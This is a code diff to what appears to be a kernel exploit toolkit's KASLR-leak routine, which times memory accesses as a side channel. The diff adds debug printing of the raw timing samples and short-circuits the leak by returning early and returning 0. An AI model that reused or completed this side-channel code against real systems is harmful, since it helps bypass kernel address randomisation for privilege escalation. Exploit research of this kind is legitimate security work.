@@ -18,6 +18,7 @@
 #include <sched.h>
 #include <stdint.h>
 #include <optional>
+#include <sstream>
 #include <xdk/util/error.h>
 #include <xdk/util/pwn_utils.h>
 #include <stdio.h>
@@ -210,11 +211,24 @@ std::optional<uint64_t> try_leak_kaslr_base(int samples) {
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
-            syscall(104);
+            // syscall(104);
             uint64_t timing = sidechannel(addr);
             all_timings[slot].push_back(timing);
         }
     }
+
+    printf("--- COLLECT SAMPLES BEGIN\n");
+    for (size_t i = 0; i < all_timings.size(); i++) {
+        printf("%lx: ", slot_to_addr(i)); 
+        const auto& ts = all_timings[i]; 
+        for (auto t : ts) {
+            printf("%lu ", t);
+        }
+        printf("\n");
+    }
+    printf("--- COLLECT SAMPLES END\n");
+
+    return std::nullopt;
 
     std::vector<uint64_t> timings(slots);
     for (size_t slot = 0; slot < slots; slot++) {
@@ -266,10 +280,11 @@ uint64_t leak_kaslr_base(int samples, int trials) {
         for (int trial = 0; trial < trials; trial++) {
             slots[trial] = try_leak_kaslr_base(samples);
         }
-        std::optional<uint64_t> slot = find_majority(slots);
-        if (slot.has_value()) {
-            return *slot;
-        }
+        return 0;
+        // std::optional<uint64_t> slot = find_majority(slots);
+        // if (slot.has_value()) {
+        //     return *slot;
+        // }
     }
     throw ExpKitError("Failed to leak KASLR base");
 }
